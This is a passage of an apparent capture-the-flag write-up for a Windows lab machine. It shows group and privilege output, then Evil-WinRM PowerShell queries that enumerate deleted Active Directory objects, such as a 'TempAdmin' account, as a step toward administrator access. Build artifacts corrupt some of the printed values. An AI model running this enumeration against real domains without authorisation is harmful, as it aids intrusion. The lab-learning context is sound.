NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group             
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group             
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448                                                                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
</span></code></pre></div></div>
<p>This thing seems very instresting!!</p>

<p><code class="language-plaintext highlighter-rouge">CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group</code></p>

<h2 id="finding-the-deleted-objects">Finding the Deleted Objects:</h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>rksvc<span class="se">\D</span>ocuments&gt; Get-ADObject <span class="nt">-ldapFilter</span>:<span class="s2">"(msDS-LastKnownRDN=*)"</span> <span class="nt">-IncludeDeletedObjects</span>



Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>CASC-WS1&lt;<span class="o">!</span>JEKYLL@7000@48&gt;ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>Scheduled Tasks&lt;<span class="o">!</span>JEKYLL@7000@48&gt;ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : Scheduled Tasks
                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
ObjectClass       : group
ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">={</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span>&lt;<span class="o">!</span>JEKYLL@7000@48&gt;ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : <span class="o">{</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span>
                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ObjectClass       : groupPolicyContainer
ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>Machine&lt;<span class="o">!</span>JEKYLL@7000@48&gt;ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : Machine
                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
ObjectClass       : container
ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>User&lt;<span class="o">!</span>JEKYLL@7000@48&gt;ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : User
                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
ObjectClass       : container
ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>TempAdmin&lt;<span class="o">!</span>JEKYLL@7000@48&gt;ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059

</code></pre></div></div>

<p>The below ones are intresting!</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Deleted</span>           <span class="p">:</span> <span class="no">True</span>
<span class="no">DistinguishedName</span> <span class="p">:</span> <span class="no">CN</span><span class="o">=</span><span class="no">TempAdmin</span><span class="o">&lt;!</span><span class="no">JEKYLL</span><span class="err">@</span><span class="mi">7000</span><span class="err">@</span><span class="mi">49</span><span class="o">&gt;</span><span class="no">ADEL</span><span class="ss">:f0cc344d</span><span class="o">-</span><span class="mf">31e0</span><span class="o">-</span><span class="mi">4866</span><span class="o">-</span><span class="n">bceb</span><span class="o">-</span><span class="n">a842791ca059</span><span class="p">,</span><span class="no">CN</span><span class="o">=</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="no">Name</span>              <span class="p">:</span> <span class="no">TempAdmin</span>
                    <span class="no">DEL</span><span class="ss">:f0cc344d</span><span class="o">-</span><span class="mf">31e0</span><span class="o">-</span><span class="mi">4866</span><span class="o">-</span><span class="n">bceb</span><span class="o">-</span><span class="n">a842791ca059</span>
<span class="no">ObjectClass</span>       <span class="p">:</span> <span class="n">user</span>
<span class="no">ObjectGUID</span>        <span class="p">:</span> <span class="n">f0cc344d</span><span class="o">-</span><span class="mf">31e0</span><span class="o">-</span><span class="mi">4866</span><span class="o">-</span><span class="n">bceb</span><span class="o">-</span><span class="n">a842791ca059</span>
</code></pre></div></div>
<h3 id="gaining-root-access">Gaining ROOT Access!!</h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">arksvc</span><span class="p">\</span><span class="no">Documents</span><span class="o">&gt;</span> <span class="no">Get</span><span class="o">-</span><span class="no">ADObject</span> <span class="o">-</span><span class="n">filter</span> <span class="s1">'isdeleted -eq $true -and name -ne "Deleted Objects"'</span> <span class="o">-</span><span class="n">includeDeletedObjects</span> <span class="o">-</span><span class="n">property</span> <span class="o">*</span>


<span class="n">accountExpires</span>                  <span class="p">:</span> <span class="mi">9223372036854775807</span>
<span class="n">badPasswordTime</span>                 <span class="p">:</span> <span class="mi">0</span>
<span class="n">badPwdCount</span>                     <span class="p">:</span> <span class="mi">0</span>
<span class="no">CanonicalName</span>                   <span class="p">:</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">local</span><span class="o">/</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="o">/</span><span class="no">CASC</span><span class="o">-</span><span class="no">WS1</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">6</span><span class="n">d97daa4</span><span class="o">-</span><span class="mf">2e82</span><span class="o">-</span><span class="mi">4946</span><span class="o">-</span><span class="n">a11e</span><span class="o">-</span><span class="n">f91fa18bfabe</span>
<span class="no">CN</span>                              <span class="p">:</span> <span class="no">CASC</span><span class="o">-</span><span class="no">WS1</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">6</span><span class="n">d97daa4</span><span class="o">-</span><span class="mf">2e82</span><span class="o">-</span><span class="mi">4946</span><span class="o">-</span><span class="n">a11e</span><span class="o">-</span><span class="n">f91fa18bfabe</span>
<span class="n">codePage</span>                        <span class="p">:</span> <span class="mi">0</span>
<span class="n">countryCode</span>                     <span class="p">:</span> <span class="mi">0</span>
<span class="no">Created</span>                         <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">9</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">7</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">19</span> <span class="no">PM</span>
<span class="n">createTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">9</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">7</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">19</span> <span class="no">PM</span>
<span class="no">Deleted</span>                         <span class="p">:</span> <span class="no">True</span>
<span class="no">Description</span>                     <span class="p">:</span>
<span class="no">DisplayName</span>                     <span class="p">:</span>
<span class="no">DistinguishedName</span>               <span class="p">:</span> <span class="no">CN</span><span class="o">=</span><span class="no">CASC</span><span class="o">-</span><span class="no">WS1</span><span class="o">&lt;!</span><span class="no">JEKYLL</span><span class="err">@</span><span class="mi">7000</span><span class="err">@</span><span class="mi">50</span><span class="o">&gt;</span><span class="no">ADEL</span><span class="p">:</span><span class="mi">6</span><span class="n">d97daa4</span><span class="o">-</span><span class="mf">2e82</span><span class="o">-</span><span class="mi">4946</span><span class="o">-</span><span class="n">a11e</span><span class="o">-</span><span class="n">f91fa18bfabe</span><span class="p">,</span><span class="no">CN</span><span class="o">=</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="n">dSCorePropagationData</span>           <span class="p">:</span> <span class="p">{</span><span class="mi">1</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">3</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">36</span> <span class="no">AM</span><span class="p">,</span> <span class="mi">1</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">12</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mo">04</span> <span class="no">AM</span><span class="p">,</span> <span class="mi">1</span><span class="o">/</span><span class="mi">9</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">7</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">19</span> <span class="no">PM</span><span class="p">,</span> <span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="mi">1601</span> <span class="mi">12</span><span class="p">:</span><span class="mo">04</span><span class="p">:</span><span class="mi">17</span> <span class="no">AM</span><span class="p">}</span>
<span class="n">instanceType</span>                    <span class="p">:</span> <span class="mi">4</span>
<span class="n">isCriticalSystemObject</span>          <span class="p">:</span> <span class="no">False</span>
<span class="n">isDeleted</span>                       <span class="p">:</span> <span class="no">True</span>
<span class="no">LastKnownParent</span>                 <span class="p">:</span> <span class="no">OU</span><span class="o">=</span><span class="no">Computers</span><span class="p">,</span><span class="no">OU</span><span class="o">=</span><span class="no">UK</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="n">lastLogoff</span>                      <span class="p">:</span> <span class="mi">0</span>
<span class="n">lastLogon</span>                       <span class="p">:</span> <span class="mi">0</span>
<span class="n">localPolicyFlags</span>                <span class="p">:</span> <span class="mi">0</span>
<span class="n">logonCount</span>                      <span class="p">:</span> <span class="mi">0</span>
<span class="no">Modified</span>                        <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">28</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">6</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="mi">35</span> <span class="no">PM</span>
<span class="n">modifyTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">28</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">6</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="mi">35</span> <span class="no">PM</span>
<span class="n">msDS</span><span class="o">-</span><span class="no">LastKnownRDN</span>               <span class="p">:</span> <span class="no">CASC</span><span class="o">-</span><span class="no">WS1</span>
<span class="no">Name</span>                            <span class="p">:</span> <span class="no">CASC</span><span class="o">-</span><span class="no">WS1</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">6</span><span class="n">d97daa4</span><span class="o">-</span><span class="mf">2e82</span><span class="o">-</span><span class="mi">4946</span><span class="o">-</span><span class="n">a11e</span><span class="o">-</span><span class="n">f91fa18bfabe</span>
<span class="n">nTSecurityDescriptor</span>            <span class="p">:</span> <span class="no">System</span><span class="o">.</span><span class="no">DirectoryServices</span><span class="o">.</span><span class="no">ActiveDirectorySecurity</span>
<span class="no">ObjectCategory</span>                  <span class="p">:</span>
<span class="no">ObjectClass</span>                     <span class="p">:</span> <span class="n">computer</span>
<span class="no">ObjectGUID</span>                      <span class="p">:</span> <span class="mi">6</span><span class="n">d97daa4</span><span class="o">-</span><span class="mf">2e82</span><span class="o">-</span><span class="mi">4946</span><span class="o">-</span><span class="n">a11e</span><span class="o">-</span><span class="n">f91fa18bfabe</span>
<span class="n">objectSid</span>                       <span class="p">:</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">3332504370</span><span class="o">-</span><span class="mi">1206983947</span><span class="o">-</span><span class="mi">1165150453</span><span class="o">-</span><span class="mi">1108</span>
<span class="n">primaryGroupID</span>                  <span class="p">:</span> <span class="mi">515</span>
<span class="no">ProtectedFromAccidentalDeletion</span> <span class="p">:</span> <span class="no">False</span>
<span class="n">pwdLastSet</span>                      <span class="p">:</span> <span class="mi">132230718192147073</span>
<span class="n">sAMAccountName</span>                  <span class="p">:</span> <span class="no">CASC</span><span class="o">-</span><span class="no">WS1</span><span class="err">$</span>
<span class="n">sDRightsEffective</span>               <span class="p">:</span> <span class="mi">0</span>
<span class="n">userAccountControl</span>              <span class="p">:</span> <span class="mi">4128</span>
<span class="n">uSNChanged</span>                      <span class="p">:</span> <span class="mi">245849</span>
<span class="n">uSNCreated</span>                      <span class="p">:</span> <span class="mi">24603</span>
<span class="n">whenChanged</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">28</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">6</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="mi">35</span> <span class="no">PM</span>
<span class="n">whenCreated</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">9</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">7</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">19</span> <span class="no">PM</span>

<span class="no">CanonicalName</span>                   <span class="p">:</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">local</span><span class="o">/</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="o">/</span><span class="no">Scheduled</span> <span class="no">Tasks</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">13375728</span><span class="o">-</span><span class="mi">5</span><span class="n">ddb</span><span class="o">-</span><span class="mi">4137</span><span class="o">-</span><span class="n">b8b8</span><span class="o">-</span><span class="n">b9041d1d3fd2</span>
<span class="no">CN</span>                              <span class="p">:</span> <span class="no">Scheduled</span> <span class="no">Tasks</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">13375728</span><span class="o">-</span><span class="mi">5</span><span class="n">ddb</span><span class="o">-</span><span class="mi">4137</span><span class="o">-</span><span class="n">b8b8</span><span class="o">-</span><span class="n">b9041d1d3fd2</span>
<span class="no">Created</span>                         <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">13</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">5</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">53</span> <span class="no">PM</span>
<span class="n">createTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">13</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">5</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">53</span> <span class="no">PM</span>
<span class="no">Deleted</span>                         <span class="p">:</span> <span class="no">True</span>
<span class="no">Description</span>                     <span class="p">:</span>
<span class="no">DisplayName</span>                     <span class="p">:</span>
<span class="no">DistinguishedName</span>               <span class="p">:</span> <span class="no">CN</span><span class="o">=</span><span class="no">Scheduled</span> <span class="no">Tasks</span><span class="o">&lt;!</span><span class="no">JEKYLL</span><span class="err">@</span><span class="mi">7000</span><span class="err">@</span><span class="mi">50</span><span class="o">&gt;</span><span class="no">ADEL</span><span class="p">:</span><span class="mi">13375728</span><span class="o">-</span><span class="mi">5</span><span class="n">ddb</span><span class="o">-</span><span class="mi">4137</span><span class="o">-</span><span class="n">b8b8</span><span class="o">-</span><span class="n">b9041d1d3fd2</span><span class="p">,</span><span class="no">CN</span><span class="o">=</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="n">dSCorePropagationData</span>           <span class="p">:</span> <span class="p">{</span><span class="mi">1</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">9</span><span class="p">:</span><span class="mi">35</span><span class="p">:</span><span class="mi">46</span> <span class="no">PM</span><span class="p">,</span> <span class="mi">1</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">9</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">57</span> <span class="no">PM</span><span class="p">,</span> <span class="mi">1</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">3</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">36</span> <span class="no">AM</span><span class="p">,</span> <span class="mi">1</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">12</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mo">04</span> <span class="no">AM</span><span class="o">...</span><span class="p">}</span>
<span class="n">groupType</span>                       <span class="p">:</span> <span class="o">-</span><span class="mi">2147483644</span>
<span class="n">instanceType</span>                    <span class="p">:</span> <span class="mi">4</span>
<span class="n">isDeleted</span>                       <span class="p">:</span> <span class="no">True</span>
<span class="no">LastKnownParent</span>                 <span class="p">:</span> <span class="no">OU</span><span class="o">=</span><span class="no">Groups</span><span class="p">,</span><span class="no">OU</span><span class="o">=</span><span class="no">UK</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="no">Modified</span>                        <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">28</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">6</span><span class="p">:</span><span class="mo">07</span><span class="p">:</span><span class="mi">55</span> <span class="no">PM</span>
<span class="n">modifyTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">28</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">6</span><span class="p">:</span><span class="mo">07</span><span class="p">:</span><span class="mi">55</span> <span class="no">PM</span>
<span class="n">msDS</span><span class="o">-</span><span class="no">LastKnownRDN</span>               <span class="p">:</span> <span class="no">Scheduled</span> <span class="no">Tasks</span>
<span class="no">Name</span>                            <span class="p">:</span> <span class="no">Scheduled</span> <span class="no">Tasks</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">13375728</span><span class="o">-</span><span class="mi">5</span><span class="n">ddb</span><span class="o">-</span><span class="mi">4137</span><span class="o">-</span><span class="n">b8b8</span><span class="o">-</span><span class="n">b9041d1d3fd2</span>
<span class="n">nTSecurityDescriptor</span>            <span class="p">:</span> <span class="no">System</span><span class="o">.</span><span class="no">DirectoryServices</span><span class="o">.</span><span class="no">ActiveDirectorySecurity</span>
<span class="no">ObjectCategory</span>                  <span class="p">:</span>
<span class="no">ObjectClass</span>                     <span class="p">:</span> <span class="n">group</span>
<span class="no">ObjectGUID</span>                      <span class="p">:</span> <span class="mi">13375728</span><span class="o">-</span><span class="mi">5</span><span class="n">ddb</span><span class="o">-</span><span class="mi">4137</span><span class="o">-</span><span class="n">b8b8</span><span class="o">-</span><span class="n">b9041d1d3fd2</span>
<span class="n">objectSid</span>                       <span class="p">:</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">3332504370</span><span class="o">-</span><span class="mi">1206983947</span><span class="o">-</span><span class="mi">1165150453</span><span class="o">-</span><span class="mi">1131</span>
<span class="no">ProtectedFromAccidentalDeletion</span> <span class="p">:</span> <span class="no">False</span>
<span class="n">sAMAccountName</span>                  <span class="p">:</span> <span class="no">Scheduled</span> <span class="no">Tasks</span>
<span class="n">sDRightsEffective</span>               <span class="p">:</span> <span class="mi">0</span>
<span class="n">uSNChanged</span>                      <span class="p">:</span> <span class="mi">245848</span>
<span class="n">uSNCreated</span>                      <span class="p">:</span> <span class="mi">114790</span>
<span class="n">whenChanged</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">28</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">6</span><span class="p">:</span><span class="mo">07</span><span class="p">:</span><span class="mi">55</span> <span class="no">PM</span>
<span class="n">whenCreated</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">13</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">5</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">53</span> <span class="no">PM</span>

<span class="no">CanonicalName</span>                   <span class="p">:</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">local</span><span class="o">/</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="o">/</span><span class="p">{</span><span class="no">A403B701</span><span class="o">-</span><span class="no">A528</span><span class="o">-</span><span class="mi">4685</span><span class="o">-</span><span class="no">A816</span><span class="o">-</span><span class="no">FDEE32BDDCBA</span><span class="p">}</span>
                                  <span class="no">DEL</span><span class="ss">:ff5c2fdc</span><span class="o">-</span><span class="n">cc11</span><span class="o">-</span><span class="mf">44e3</span><span class="o">-</span><span class="n">ae4c</span><span class="o">-</span><span class="mo">071</span><span class="n">aab2ccc6e</span>
<span class="no">CN</span>                              <span class="p">:</span> <span class="p">{</span><span class="no">A403B701</span><span class="o">-</span><span class="no">A528</span><span class="o">-</span><span class="mi">4685</span><span class="o">-</span><span class="no">A816</span><span class="o">-</span><span class="no">FDEE32BDDCBA</span><span class="p">}</span>
                                  <span class="no">DEL</span><span class="ss">:ff5c2fdc</span><span class="o">-</span><span class="n">cc11</span><span class="o">-</span><span class="mf">44e3</span><span class="o">-</span><span class="n">ae4c</span><span class="o">-</span><span class="mo">071</span><span class="n">aab2ccc6e</span>
<span class="no">Created</span>                         <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">30</span> <span class="no">AM</span>
<span class="n">createTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">30</span> <span class="no">AM</span>
<span class="no">Deleted</span>                         <span class="p">:</span> <span class="no">True</span>
<span class="no">Description</span>                     <span class="p">:</span>
<span class="no">DisplayName</span>                     <span class="p">:</span> <span class="no">Block</span> <span class="no">Potato</span>
<span class="no">DistinguishedName</span>               <span class="p">:</span> <span class="no">CN</span><span class="o">=</span><span class="p">{</span><span class="no">A403B701</span><span class="o">-</span><span class="no">A528</span><span class="o">-</span><span class="mi">4685</span><span class="o">-</span><span class="no">A816</span><span class="o">-</span><span class="no">FDEE32BDDCBA</span><span class="p">}</span><span class="o">&lt;!</span><span class="no">JEKYLL</span><span class="err">@</span><span class="mi">7000</span><span class="err">@</span><span class="mi">50</span><span class="o">&gt;</span><span class="no">ADEL</span><span class="ss">:ff5c2fdc</span><span class="o">-</span><span class="n">cc11</span><span class="o">-</span><span class="mf">44e3</span><span class="o">-</span><span class="n">ae4c</span><span class="o">-</span><span class="mo">071</span><span class="n">aab2ccc6e</span><span class="p">,</span><span class="no">CN</span><span class="o">=</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="n">dSCorePropagationData</span>           <span class="p">:</span> <span class="p">{</span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="mi">1601</span> <span class="mi">12</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span> <span class="no">AM</span><span class="p">}</span>
<span class="n">flags</span>                           <span class="p">:</span> <span class="mi">0</span>
<span class="n">gPCFileSysPath</span>                  <span class="p">:</span> <span class="p">\</span><span class="n">cascade</span><span class="p">.</span><span class="nf">local</span><span class="p">\</span><span class="no">SysVol</span><span class="p">\</span><span class="n">cascade</span><span class="p">.</span><span class="nf">local</span><span class="p">\</span><span class="no">Policies</span><span class="p">\{</span><span class="no">A403B701</span><span class="o">-</span><span class="no">A528</span><span class="o">-</span><span class="mi">4685</span><span class="o">-</span><span class="no">A816</span><span class="o">-</span><span class="no">FDEE32BDDCBA</span><span class="p">}</span>
<span class="n">gPCFunctionalityVersion</span>         <span class="p">:</span> <span class="mi">2</span>
<span class="n">gPCMachineExtensionNames</span>        <span class="p">:</span> <span class="p">[{</span><span class="mi">35378</span><span class="no">EAC</span><span class="o">-</span><span class="mi">683</span><span class="no">F</span><span class="o">-</span><span class="mi">11</span><span class="no">D2</span><span class="o">-</span><span class="no">A89A</span><span class="o">-</span><span class="mo">00</span><span class="no">C04FBBCFA2</span><span class="p">}{</span><span class="mi">53</span><span class="no">D6AB1D</span><span class="o">-</span><span class="mi">2488</span><span class="o">-</span><span class="mi">11</span><span class="no">D1</span><span class="o">-</span><span class="no">A28C</span><span class="o">-</span><span class="mo">00</span><span class="no">C04FB94F17</span><span class="p">}][{</span><span class="no">B1BE8D72</span><span class="o">-</span><span class="mi">6</span><span class="no">EAC</span><span class="o">-</span><span class="mi">11</span><span class="no">D2</span><span class="o">-</span><span class="no">A4EA</span><span class="o">-</span><span class="mo">00</span><span class="no">C04F79F83A</span><span class="p">}{</span><span class="mi">53</span><span class="no">D6AB1D</span><span class="o">-</span><span class="mi">2488</span><span class="o">-</span><span class="mi">11</span><span class="no">D1</span><span class="o">-</span><span class="no">A28C</span><span class="o">-</span><span class="mo">00</span><span class="no">C04FB94F17</span><span class="p">}]</span>
<span class="n">instanceType</span>                    <span class="p">:</span> <span class="mi">4</span>
<span class="n">isDeleted</span>                       <span class="p">:</span> <span class="no">True</span>
<span class="no">LastKnownParent</span>                 <span class="p">:</span> <span class="no">CN</span><span class="o">=</span><span class="no">Policies</span><span class="p">,</span><span class="no">CN</span><span class="o">=</span><span class="no">System</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="no">Modified</span>                        <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">52</span> <span class="no">AM</span>
<span class="n">modifyTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">52</span> <span class="no">AM</span>
<span class="n">msDS</span><span class="o">-</span><span class="no">LastKnownRDN</span>               <span class="p">:</span> <span class="p">{</span><span class="no">A403B701</span><span class="o">-</span><span class="no">A528</span><span class="o">-</span><span class="mi">4685</span><span class="o">-</span><span class="no">A816</span><span class="o">-</span><span class="no">FDEE32BDDCBA</span><span class="p">}</span>
<span class="no">Name</span>                            <span class="p">:</span> <span class="p">{</span><span class="no">A403B701</span><span class="o">-</span><span class="no">A528</span><span class="o">-</span><span class="mi">4685</span><span class="o">-</span><span class="no">A816</span><span class="o">-</span><span class="no">FDEE32BDDCBA</span><span class="p">}</span>
                                  <span class="no">DEL</span><span class="ss">:ff5c2fdc</span><span class="o">-</span><span class="n">cc11</span><span class="o">-</span><span class="mf">44e3</span><span class="o">-</span><span class="n">ae4c</span><span class="o">-</span><span class="mo">071</span><span class="n">aab2ccc6e</span>
